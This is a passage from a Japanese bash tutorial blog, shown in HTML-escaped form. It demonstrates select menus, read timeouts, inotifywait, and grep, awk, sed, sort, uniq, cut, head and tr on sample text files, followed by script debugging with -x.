&lt;span class="nv">url&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;http://www.ovh.net/files/1Mb.dat&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
curl -I &lt;span class="si">${&lt;/span>&lt;span class="nv">url&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="p">;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="selectコマンド">selectコマンド&lt;/h2>
&lt;p>selectコマンドは、列挙したリストを表示させ、ユーザーに入力を促します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:select.sh" data-lang="bash:select.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">select&lt;/span> car in BMW MERCEDES TESLA ROVER TOYOTA&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;you have selected &lt;/span>&lt;span class="nv">$car&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash select.sh
1) BMW 3) TESLA 5) TOYOTA
2) MERCEDES 4) ROVER
#? 3
you have selected TESLA
#? 4
you have selected ROVER
#?
&lt;/code>&lt;/pre>&lt;p>この場合、選択した車のオプションが表示されますが、オプション以外の番号を入力すると何もしません。&lt;br>
以下の例では、swich-caseを使用して、ユーザーが他の車のオプションを入力した場合、「1から5の間で選択してください」というエラーメッセージが表示されます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:select.sh" data-lang="bash:select.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="k">select&lt;/span> car in BMW MERCEDES TESLA ROVER TOYOTA&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="k">case&lt;/span> &lt;span class="nv">$car&lt;/span> in
BMW&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;BMW SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
MERCEDES&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;MERCEDES SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
TESLA&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;TESLA SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
ROVER&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ROVER SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
TOYOTA&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;TOYOTA SELECTED&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
*&lt;span class="o">)&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR! Please select between 1 to 5&amp;#34;&lt;/span>&lt;span class="p">;;&lt;/span>
&lt;span class="k">esac&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>プロのメニューでは、プログラムはユーザーの入力を待つ必要があります。&lt;br>
このスクリプトでは、ユーザーに「続行するには任意のキーを押して」ように依頼し、「read -t 3 -n 1」コマンドを使用して3秒ごとにユーザーに「キーSirを押すのを待っています」というリマインダーを送信します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:select.sh" data-lang="bash:select.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;press any key to continue&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">while&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nb">true&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">do&lt;/span>
&lt;span class="c1"># ３秒ごとに入力を促す&lt;/span>
&lt;span class="nb">read&lt;/span> -t &lt;span class="m">3&lt;/span> -n 1&lt;span class="p">;&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="o">[&lt;/span> &lt;span class="nv">$?&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="m">0&lt;/span> &lt;span class="o">]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;you have terminated the script&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
exit&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;waiting for you to press the key Sir&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;span class="k">done&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="inotifyコマンド-ファイルの変更を監視する">inotifyコマンド ファイルの変更を監視する&lt;/h2>
&lt;p>inotifyを使用してファイルを変更を監視するする方法を説明します。&lt;br>
inotifyの正式名称は「inode notify」です。&lt;br>
inotifyは、ファイルシステムの変更を監視し、、変更をアプリケーションに報告するLinuxカーネルサブシステムです。inotifyを操作するには、まずターミナルからinotifyをインストールする必要があります。&lt;/p>
&lt;p>Linuxの場合&lt;/p>
&lt;pre tabindex="0">&lt;code>$ yum install inotify-tools
&lt;/code>&lt;/pre>&lt;p>inotifyがどのように反応するかを確認します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:inotify.sh" data-lang="bash:inotify.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
mkdir -p iNotifyTest
inotifywait -m iNotifyTest
&lt;/code>&lt;/pre>&lt;/div>&lt;p>では、ターミナルの出力を確認します。&lt;br>
ターミナルをもう一つ起動して上記スクリプトを実行しているターミナルと並べて開きます。&lt;/p>
&lt;p>モニターとしてのinotify.shの動作を見ながら別のターミナルウィンドウを開き、「$ touch file1.txt」でファイルを作成すると、inotifyが反応し、ファイルシステムで現在起こっているすべてのアクションを監視していることがわかります。&lt;/p>
&lt;p>次に「file1.txt」に何かを書き、inotifyで動作するターミナルウィンドウからの応答を確認してください。&lt;/p>
&lt;h2 id="grepコマンド">grepコマンド&lt;/h2>
&lt;p>grepコマンドについてはここで詳しく書きました。&lt;br>
&lt;a class="link" href="https://suzukiiichiro.github.io/posts/2022-01-24-01-suzuki/" target="_blank" rel="noopener"
>【 grep 特集】「ざっくりわかるシェルスクリプト４」&lt;/a>&lt;/p>
&lt;p>それはそれとして、ここではざっくりと説明します。&lt;/p>
&lt;p>grepは ‘global regular expression print’ の略です。&lt;br>
このコマンドは、テキストを1行ずつ処理してファイル内のパターンを検索するために使用されます。&lt;br>
まず、touchコマンドを使用してfilegrep.txtという名前のファイルを作成します。ターミナルに次のコードを入力します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ touch filegrep.txt
$ vim filegrep.txt
&lt;/code>&lt;/pre>&lt;p>filegrep.txtを開き、ファイルに次のコンテンツを書き込みます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grepfile.txt" data-lang="bash:grepfile.txt">This is Linux
This is Windows
This is MAC
This is Linux
This is Windows
This is MAC
This is Linux
This is Windows
This is MAC
This is Linux
This is Windows
This is MAC
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grep.sh" data-lang="bash:grep.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したいファイル名を指定して下さい。&amp;#34;&lt;/span>
&lt;span class="c1"># 入力を grepfile.txt&lt;/span>
&lt;span class="nb">read&lt;/span> fileName
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したい語句を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> grepvar&lt;span class="p">;&lt;/span>
grep &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$grepvar&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash test
検索したいファイル名を指定して下さい。
grepfile.txt
検索したい語句を入力して下さい。
linux
$
&lt;/code>&lt;/pre>&lt;p>入力は「linux」（小文字のエル）ですが、ファイル内のテキストは「Linux」（大文字のエル）で書かれているため、検索結果には何も表示されません。ここでは、grepコマンドに「-i」のフラグを追加するだけで、この大文字と小文字を区別する問題に対処する必要があります。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grep2.sh" data-lang="bash:grep2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したいファイル名を指定して下さい。&amp;#34;&lt;/span>
&lt;span class="c1"># 入力を grepfile.txt&lt;/span>
&lt;span class="nb">read&lt;/span> fileName
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したい語句を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> grepvar&lt;span class="p">;&lt;/span>
&lt;span class="c1"># 大文字小文字の区別をしないオプション -i&lt;/span>
grep -i &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$grepvar&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash grep2.sh
検索したいファイル名を指定して下さい。
grepfile.txt
検索したい語句を入力して下さい。
linux
This is Linux
This is Linux
This is Linux
This is Linux
$
&lt;/code>&lt;/pre>&lt;p>出力で行番号を抽出することもできます。このためには、grepコマンドに「-n」の別のフラグを追加するだけです。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grep3.sh" data-lang="bash:grep3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したいファイル名を指定して下さい。&amp;#34;&lt;/span>
&lt;span class="c1"># 入力を grepfile.txt&lt;/span>
&lt;span class="nb">read&lt;/span> fileName
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したい語句を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> grepvar&lt;span class="p">;&lt;/span>
&lt;span class="c1"># 大文字小文字の区別をしないオプション -i&lt;/span>
grep -in &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$grepvar&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash grep3.sh
検索したいファイル名を指定して下さい。
grepfile.txt
検索したい語句を入力して下さい。
linux
1:This is Linux
4:This is Linux
7:This is Linux
10:This is Linux
$
&lt;/code>&lt;/pre>&lt;p>ドキュメント内の特定の単語の発生回数を取得することもできます。grepコマンド「grep -i -c $grepvar $fileName」に「-c」フラグを追加し、スクリプトを保存し、端末を使用して実行します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:grep4.sh" data-lang="bash:grep4.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したいファイル名を指定して下さい。&amp;#34;&lt;/span>
&lt;span class="c1"># 入力を grepfile.txt&lt;/span>
&lt;span class="nb">read&lt;/span> fileName
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;検索したい語句を入力して下さい。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="nb">read&lt;/span> grepvar&lt;span class="p">;&lt;/span>
&lt;span class="c1"># 大文字小文字の区別をしないオプション -i&lt;/span>
grep -inc &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$grepvar&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash test
検索したいファイル名を指定して下さい。
grepfile.txt
検索したい語句を入力して下さい。
linux
4
$
&lt;/code>&lt;/pre>&lt;h2 id="awkコマンド">awkコマンド&lt;/h2>
&lt;p>awkは、データの操作やレポートの作成に使用されるスクリプト言語です。&lt;br>
コンパイルを必要とせず、変数、数値関数、文字列関数、論理演算子が使用できます。&lt;br>
何より処理が高速です。bashよりも高速である場合が多いです。&lt;br>
このトピックでは、シェルスクリプトで多く多用されるawkコマンドの一例を紹介します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | awk '{ print; }';
This is Linux
This is Windows
This is MAC
This is Linux
This is Windows
This is MAC
This is Linux
This is Windows
This is MAC
This is Linux
This is Windows
This is MAC
$
&lt;/code>&lt;/pre>&lt;p>「awk」を使用して特定のパターンを検索することもできます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | awk '/Linux/ { print; }';
This is Linux
This is Linux
This is Linux
This is Linux
$
&lt;/code>&lt;/pre>&lt;p>次の例では、プログラムがターゲットワードを見つけた行からコンテンツを抽出する方法を見ていきます。 「$1」はその行の最初の単語を表し、同様に「$2」は2番目を表し、「$3」は3番目の単語を表し、「$4」はこの場合最後の単語を表します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | awk '/Linux/ { print $3; }';
Linux
Linux
Linux
Linux
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>awkはとても優れたプログラミング言語で、シェル薬婦とを学ぶことと同じほどのボリュームのある言語です。ただ、シェルスクリプトで使われる多くのbashコマンドを使いこなすことで、awkでないとできないことは限られます。まずはこのトピックで使われるawkコマンドの利用例を身につければオッケーです。すこしずつ覚えていくことを増やしていけばよいのです。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="sedコマンド">sedコマンド&lt;/h2>
&lt;p>sedコマンドはストリームエディタの略で、標準入力またはファイルからのテキストの編集操作を実行します。&lt;br>
このトピックでは「i」を「I」に置き換えます。&lt;br>
そのためには、次の sed コマンド &amp;lsquo;cat grepfile.txt | sed -e &amp;rsquo;s/i/I/&amp;rsquo; と書くだけで、cat コマンドを使用してファイルの内容を取得し、パイプ &amp;lsquo;|&amp;rsquo; 記号の後に、&amp;lsquo;sed&amp;rsquo; キーワードを使用して、このケースを置き換える操作を指定します。&lt;br>
「s」はスラッシュと置き換えると言う意味です。&lt;br>
「-e」はsed コマンドを連続してフィルタリングすることを可能とするオプションです。&lt;br>
/置き換え前/置き換え後/&lt;br>
となります。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | sed -e &amp;quot;s/i/I/&amp;quot;
ThIs is Linux
ThIs is Windows
ThIs is MAC
ThIs is Linux
ThIs is Windows
ThIs is MAC
ThIs is Linux
ThIs is Windows
ThIs is MAC
ThIs is Linux
ThIs is Windows
ThIs is MAC
$
&lt;/code>&lt;/pre>&lt;p>最初に出てくる &amp;lsquo;This is Linux&amp;rsquo; が &amp;lsquo;ThIs is Linux&amp;rsquo; となったことが解ります。&lt;br>
-g オプションを末尾につけることで、複数回の処理で置き換えます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | sed -e &amp;quot;s/i/I/g&amp;quot;
ThIs Is LInux
ThIs Is WIndows
ThIs Is MAC
ThIs Is LInux
ThIs Is WIndows
ThIs Is MAC
ThIs Is LInux
ThIs Is WIndows
ThIs Is MAC
ThIs Is LInux
ThIs Is WIndows
ThIs Is MAC
$
&lt;/code>&lt;/pre>&lt;p>以下のコマンドで、処理結果を簡単にファイルに出力して、エディターなどで開いて確認する事ができます。&lt;/p>
&lt;pre tabindex="0">&lt;code>cat filegrep.txt | sed -e 's/i/I/g' &amp;gt; newfile.txt
&lt;/code>&lt;/pre>&lt;p>単語全体を別の単語に置き換えることもできます。たとえば、以下に示すスクリプトでは、「Linux」のすべてのインスタンスが端末に表示中に「Unix」に置き換えられます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat grepfile.txt | sed -e &amp;quot;s/Linux/Unix/g&amp;quot;
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
$
&lt;/code>&lt;/pre>&lt;h2 id="sortコマンド">sortコマンド&lt;/h2>
&lt;p>テキストファイルを行単位で並べ替える&lt;br>
sort 並べ替える&lt;br>
sort -n 数値扱いで並べ替える&lt;br>
sort -r 逆順で出力&lt;/p>
&lt;p>まずは以下の読み込み用サンプルファイルを準備します。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:sample.txt" data-lang="bash:sample.txt">name:ヤムチャ skill:狼牙風風拳
name:孫悟空 skill:かめはめ波
name:ピッコロ skill:魔貫光殺砲
name:ヤムチャ skill:繰気弾
name:孫悟空 skill:元気玉
name:クリリン skill:気円斬
name:ヤムチャ skill:かめはめ波
name:クリリン skill:かめはめ波
name:孫悟空 skill:ジャン拳
name:ヤムチャ skill:新狼牙風風拳
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort
name:孫悟空
name:孫悟空
name:孫悟空
name:クリリン
name:クリリン
name:ピッコロ
name:ヤムチャ
name:ヤムチャ
name:ヤムチャ
name:ヤムチャ
&lt;/code>&lt;/pre>&lt;p>解説&lt;br>
grep -E&lt;br>
検索に「拡張正規表現」を使えるようにする。&lt;br>
^[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3}.[0-9]{1,3} でIPアドレスに一致させる。&lt;/p>
&lt;p>grep -o&lt;br>
通常の grep では一致した行全体が表示されるが、-o を指定することにより一致した文字のみを表示させることができる。&lt;/p>
&lt;p>sort&lt;br>
次の uniq で重複行のカウントを行うため、並び替える。&lt;/p>
&lt;h2 id="uniqコマンド">uniqコマンド&lt;/h2>
&lt;p>uniq -c&lt;br>
重複行のカウントを表示する。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort | uniq -c
3 name:孫悟空
2 name:クリリン
1 name:ピッコロ
4 name:ヤムチャ
$
&lt;/code>&lt;/pre>&lt;h2 id="sort--r-逆順">sort -r 逆順&lt;/h2>
&lt;p>sort -r&lt;br>
カウントの降順で並べ替える。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort | uniq -c | sort -r
4 name:ヤムチャ
3 name:孫悟空
2 name:クリリン
1 name:ピッコロ
&lt;/code>&lt;/pre>&lt;h2 id="cutコマンド">cutコマンド&lt;/h2>
&lt;p>cut:タブ区切りでフィールドを選択して出力する&lt;br>
cut -d:デリミタを指定。いわゆる区切り文字&lt;br>
cut -f:抽出するフィールドの番号を指定する。上記コマンドで1を指定した場合は二つ目の&amp;quot;name&amp;quot;が抽出される。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort | uniq -c | sort -r | cut -d &amp;quot;:&amp;quot; -f2
ヤムチャ
孫悟空
クリリン
ピッコロ
$
&lt;/code>&lt;/pre>&lt;h2 id="headコマンド">headコマンド&lt;/h2>
&lt;p>長いメッセージやテキストファイルの先頭だけ／末尾だけを表示する&lt;/p>
&lt;p>head -n&lt;br>
n: 出力する行数を指定する。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat sample.txt | grep -o &amp;quot;name:\S*&amp;quot; | sort | uniq -c | sort -r | cut -d &amp;quot;:&amp;quot; -f2 | head -n2
ヤムチャ
孫悟空
$
&lt;/code>&lt;/pre>&lt;h2 id="trコマンド">trコマンド&lt;/h2>
&lt;p>テキストファイルの文字を置換する／削除する&lt;/p>
&lt;p>「-d」オプションで、指定した文字を削除することができます。例えば、Windows環境で作成したテキストファイルの改行コードを、Linux環境向けに置き換えるといった用途に使用できます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat sample.txt
name:ヤムチャ skill:狼牙風風拳
name:孫悟空 skill:かめはめ波
name:ピッコロ skill:魔貫光殺砲
name:ヤムチャ skill:繰気弾
name:孫悟空 skill:元気玉
name:クリリン skill:気円斬
name:ヤムチャ skill:かめはめ波
name:クリリン skill:かめはめ波
name:孫悟空 skill:ジャン拳
name:ヤムチャ skill:新狼牙風風拳
$ cat sample.txt | tr -d '\n'
name:ヤムチャ skill:狼牙風風拳name:孫悟空 skill:かめはめ波name:ピッコロ skill:魔貫光殺砲name:ヤムチャ skill:繰気弾name:孫悟空 skill:元気玉name:クリリン skill:気円斬name:ヤムチャ skill:かめはめ波name:クリリン skill:かめはめ波name:孫悟空 skill:ジャン拳name:ヤムチャ skill:新狼牙風風拳 $
&lt;/code>&lt;/pre>&lt;p>Windows環境では、改行を「CR」（16進数0D）と「LF」（16進数0A）の2バイトで表しますが、Linux環境では「LF」のみです。trコマンドでは「CR」を「\r」で表すことができるので、「tr -d \r」としてテキストファイルから「CR」を除去することで、Linux環境用の改行コードに変換できます。&lt;/p>
&lt;p>「-s」オプションでは、指定した文字が連続している場合には1つにまとめることができます。例えば、「tr -s &amp;ldquo;\r&amp;rdquo;」では、連続した改行を1つにします。catコマンドの「-s」オプションと同じ働きになります。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>trコマンドの &amp;lsquo;\n&amp;rsquo; はシングルクォーテーションで囲む必要があります。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="スクリプトのデバッグ">スクリプトのデバッグ&lt;/h2>
&lt;p>Bashは広範なデバッグ機能を提供しています。&lt;/p>
&lt;p>デバッグの方法は３種類あります&lt;/p>
&lt;p>１．ターミナルの実行時に -x オプションを付与する&lt;/p>
&lt;pre tabindex="0">&lt;code>$ bash -x helloScript.sh
&lt;/code>&lt;/pre>&lt;p>２．ソースコードの冒頭のシェバンに -x オプションを付与する&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:debug.sh" data-lang="bash:debug.sh">&lt;span class="cp">#!/bin/bash -x
&lt;/span>&lt;span class="cp">&lt;/span>:
:
&lt;/code>&lt;/pre>&lt;/div>&lt;p>３．デバッグの開始点と終了点を決めてデバッグ&lt;br>
デバッグの開始点にコマンド &amp;lsquo;set -x&amp;rsquo;終了点には &amp;lsquo;set +x&amp;rsquo; と書きます。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:debug2.sh" data-lang="bash:debug2.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="nb">set&lt;/span> -x
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;置き換えたいファイル名を入寮して下さい。&amp;#34;&lt;/span>
&lt;span class="nb">read&lt;/span> fileName
&lt;span class="nb">set&lt;/span> +x
&lt;span class="k">if&lt;/span> &lt;span class="o">[[&lt;/span> -f &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="o">]]&lt;/span>&lt;span class="p">;&lt;/span> &lt;span class="k">then&lt;/span>
sed -e &lt;span class="s2">&amp;#34;s/Linux/Unix/g&amp;#34;&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">else&lt;/span>
&lt;span class="nb">echo&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$fileName&lt;/span>&lt;span class="s2"> はありません。&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
&lt;span class="k">fi&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash test
+ echo 置き換えたいファイル名を入寮して下さい。
置き換えたいファイル名を入寮して下さい。
+ read fileName
grepfile.txt
+ set +x
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
This is Unix
This is Windows
This is MAC
$
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash:debug3.sh" data-lang="bash:debug3.sh">&lt;span class="cp">#!/bin/bash
&lt;/span>&lt;span class="cp">&lt;/span>
&lt;span class="c1"># デバッグ開始&lt;/span>
&lt;span class="nb">set&lt;/span> -x
&lt;span class="nv">var1&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>date +%M&lt;span class="sb">`&lt;/span>
&lt;span class="c1"># デバッグ終了&lt;/span>
&lt;span class="nb">set&lt;/span> +x
&lt;span class="nv">var2&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="sb">`&lt;/span>ls -1 &lt;span class="p">|&lt;/span> wc -l&lt;span class="sb">`&lt;/span>
&lt;span class="nv">var3&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;DEBUG TEST&amp;#34;&lt;/span>
&lt;span class="nb">exit&lt;/span> &lt;span class="m">0&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre tabindex="0">&lt;code>$ bash debug3.sh
++ date +%M
+ var1=56
+ set +x
$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>だいたい解ってきたのではないかと思います。&lt;/dd>
&lt;dd>要するにシェルスクリプトは「｜パイプ」で繋いで連続する処理をフィルタリングして、目的の結果に近づけていくというものです。&lt;/dd>
&lt;dd>関数を使って、より長く複雑なことも実行可能です。&lt;/dd>
&lt;dd>Linux(CUI)でできることはすべてシェルスクリプトでできます。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
